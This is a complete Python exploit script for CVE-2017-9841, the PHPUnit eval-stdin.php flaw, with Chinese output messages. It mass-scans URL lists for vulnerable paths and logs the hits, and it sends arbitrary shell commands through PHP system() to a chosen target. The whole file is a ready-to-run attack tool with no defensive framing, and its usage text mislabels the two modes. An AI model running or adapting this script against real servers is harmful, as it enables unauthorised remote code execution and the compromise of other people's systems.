#Author:jax
import argparse
import requests
import urllib3
import re
urllib3.disable_warnings()

hello = '''
  /$$$$$$  /$$    /$$ /$$$$$$$$      /$$$$$$   /$$$$$$    /$$   /$$$$$$$$       /$$$$$$   /$$$$$$  /$$   /$$   /$$  
 /$$__  $$| $$   | $$| $$_____/     /$$__  $$ /$$$_  $$ /$$$$  |_____ $$/      /$$__  $$ /$$__  $$| $$  | $$ /$$$$  
| $$  \__/| $$   | $$| $$          |__/  \ $$| $$$$\ $$|_  $$       /$$/      | $$  \ $$| $$  \ $$| $$  | $$|_  $$  
| $$      |  $$ / $$/| $$$$$ /$$$$$$ /$$$$$$/| $$ $$ $$  | $$      /$$//$$$$$$|  $$$$$$$|  $$$$$$/| $$$$$$$$  | $$  
| $$       \  $$ $$/ | $$__/|______//$$____/ | $$\ $$$$  | $$     /$$/|______/ \____  $$ >$$__  $$|_____  $$  | $$  
| $$    $$  \  $$$/  | $$          | $$      | $$ \ $$$  | $$    /$$/          /$$  \ $$| $$  \ $$      | $$  | $$  
|  $$$$$$/   \  $/   | $$$$$$$$    | $$$$$$$$|  $$$$$$/ /$$$$$$ /$$/          |  $$$$$$/|  $$$$$$/      | $$ /$$$$$$
 \______/     \_/    |________/    |________/ \______/ |______/|__/            \______/  \______/       |__/|______/
                                                                                                                    
                                                                                                                    
                                                                                                                    
'''

headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

def rce_exp(url , cmd):
    target_url = url
    cmd_data = f"<?php system(\"{cmd}\");?>"
    try:
        resp = requests.get(target_url ,verify=False, headers = headers, data = cmd_data, timeout=10)
        resp_text = resp.text
        resp_code = resp.status_code
    except requests.exceptions.RequestException:
        print('[-]获取回显超时')
    except:
        print('[-]获取回显异常，请手动测试')
    if resp_code == 200:
            print('[+]正在执行命令：' + cmd + '\n') 
            print(resp_text)
    else:
        print('[-]获取回显失败，请确认是否存在漏洞')

#批量检测漏洞
def poc(target):
    data = "<?php echo md5(hello);?>"
    #5d41402abc4b2a76b9719d911017c592

    path_dict = [
        '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 
        '/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 
        '/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 
        '/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        ]

    print("start scaning")
    f = open(target)
    f = f.readlines()
    for url in f:
        url =url.strip('\n')
        url =url.strip('/')
        for i in range(0,5):
            target_url = url + str(path_dict[i]).strip("'")
            print(target_url)
            try:
                resp = requests.get(target_url ,verify=False, headers = headers, data = data, timeout=8)
                resp_text = resp.text
                #print(resp_text)
                resp_code = resp.status_code
                if resp_code == 200:
                    if re.search('5d41402abc4b2a76b9719d911017c592', resp_text, flags=0) != None:
                        print(f'[+]{target_url}疑似存在漏洞')
                        poc_file = open('vuln_url.txt','a+')
                        poc_file.write(target_url+'\n')
                        poc_file.close()
                        break
                else:
                    pass
            except requests.exceptions.RequestException:
                time_poc = f'[-]{target_url}漏洞检测超时'
                print(time_poc)
        print(f'[-]{url}不存在漏洞')


if __name__ == '__main__' :
    print(hello)
    parser = argparse.ArgumentParser(description="CVE-2017-9841")
    parser.add_argument('-m', '--mode', type=str, help="run mode: -m scan or rce")
    parser.add_argument('-f', '--file', type=str, help="scan urls,one url per line in file.For example : https://www.qq.com")
    parser.add_argument('-u', '--url', type=str, help="target url for example : https://www.xx.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
    parser.add_argument('-c', '--cmd', type=str, help="execute command: -c id or --cmd id")
    args = parser.parse_args()

    if args.mode == "scan" and args.file != None :
        target = args.file
        poc(target)

    elif args.cmd != None and args.url != None:
        url = args.url
        cmd = args.cmd
        rce_exp(url , cmd)
    else:
        print("scan mode: python3 CVE-2017-9841.py -u https://www.xxx.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -c id ")
        print("rce mode: python3 CVE-2017-9841.py -m scan -f 123.txt")
